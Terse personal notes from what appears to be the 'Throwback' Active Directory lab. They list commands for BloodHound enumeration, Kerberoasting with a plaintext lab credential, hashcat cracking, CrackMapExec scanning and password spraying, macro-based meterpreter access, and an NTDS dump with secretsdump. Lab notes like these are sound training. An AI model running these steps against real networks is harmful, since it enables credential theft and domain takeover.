Left off: Task 23
# Task 23

Bloodhound

Install 3.x

Set up proxy

ssh blairej@throwback-WS01

copy over SharpHound.ps1

run

Load to bloodhound

answer questions

# Task 24

Get SPN for kerberoasting

```
proxychains GetUserSPNs.py -dc-ip 10.200.70.117 THrowback.local/BlaireJ:7eQgx6YzxgG3vC45t5k9 -request
```

crack the hash
```
hashcat hash /usr/share/wordlists/rockyou.txt
```

# Task 25

scan the subnet with cme

```
proxychains crackmapexec smb 10.200.70.0/24
```

Foxyproxy

timekeep webserver

password reset email

# Task 26

Malicious macro

get meterpreter

# Task 27
migrate to system

dump hashes

crack the new hash

# Task 28

enumerate teh db

```cmd
mysql.exe -u root -p
```

# Task 29

cme to password spray

```bash
proxychains crackmapexec smb 10.200.70.117 -u <users> -p <passes>
```

# Task 30

Use bloodhound to `find principals with dcsync rights`

dump NTDS with impacket
```
secretsdump.py -dc-ip 10.200.70.117 Throwback/<user>@10.200.70.117
```

